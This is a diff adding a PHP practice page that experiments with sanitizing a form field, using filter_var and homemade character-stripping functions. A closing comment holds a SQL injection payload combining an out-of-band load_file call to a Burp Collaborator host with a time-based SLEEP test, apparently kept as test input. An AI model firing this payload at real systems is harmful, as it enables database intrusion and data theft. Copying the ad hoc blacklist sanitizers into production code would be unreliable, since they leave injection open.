@@ -1,0 +1,75 @@
+<!DOCTYPE HTML>  
+<html>
+<head>
+</head>
+<body>  
+
+<h2>PHP Form Validation Example</h2>
+<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">  
+  Name: <input type="text" name="search">
+  <br><br>
+  <input type="submit" name="submit" value="Submit">  
+</form>
+
+<?php
+//define variables
+//$search = "";
+//$search = sanitize_input($_POST["search"]);
+$search = filter_var($_POST["search"],FILTER_SANITIZE_SPECIAL_CHARS);
+
+//define a function to sanitize input
+//function sanitize_input($data) {
+//  $data = trim($data);
+//  $data = stripslashes($data);
+//  $data = htmlspecialchars($data);
+//  return $data;
+//}
+//attempt a custom function with contains/regex match
+function custom_sanitize($data) {
+  if (preg_match('/\s/', $data)) {
+      return 'true';
+  }
+  return 'false';
+}
+function custom_sanitizev2($data) {
+  $data = str_replace("+","",$data);
+  $data = str_replace(" ","",$data);
+  $data = str_replace("(","",$data);
+  $data = str_replace(")","",$data);
+  $data = str_replace("=","",$data);
+  $data = str_replace("'","",$data);
+  $data = str_replace('"',"",$data);
+  $data = str_replace("-","",$data);
+  return $data;
+}
+
+//header
+echo "<h2>Your Input:</h2>";
+//print input variable
+echo "before: ", $search;
+echo "<br>";
+echo "<br>";
+//print sanitized input variable
+//echo "custom function: ", sanitize_input($search);
+//echo "<br>";
+//echo "<br>";
+//testing another sanitization method...
+echo "built-in function: ", filter_var($search, FILTER_SANITIZE_SPECIAL_CHARS);
+echo "<br>";
+echo "<br>";
+//testing contains with regex match...
+echo custom_sanitize($search);
+echo "<br>";
+echo "<br>";
+//print sanitized input variable
+echo "custom function v2: ", custom_sanitizev2($search);
+echo "<br>";
+echo "<br>";
+echo "custom function combo: ", custom_sanitizev2(filter_var($search, FILTER_SANITIZE_SPECIAL_CHARS));
+echo "<br>";
+echo "<br>";
+//searchdata= 809262'+(select load_file('yhj3lhp8nhgr0sb7nf7ma0d0wr2hq6.burpcollaborator.net'))+'') AND (SELECT 4105 FROM (SELECT(SLEEP(5)))BzTl) AND ('Rxmr'='Rxmr&search=Search
+?>
+
+</body>
+</html>
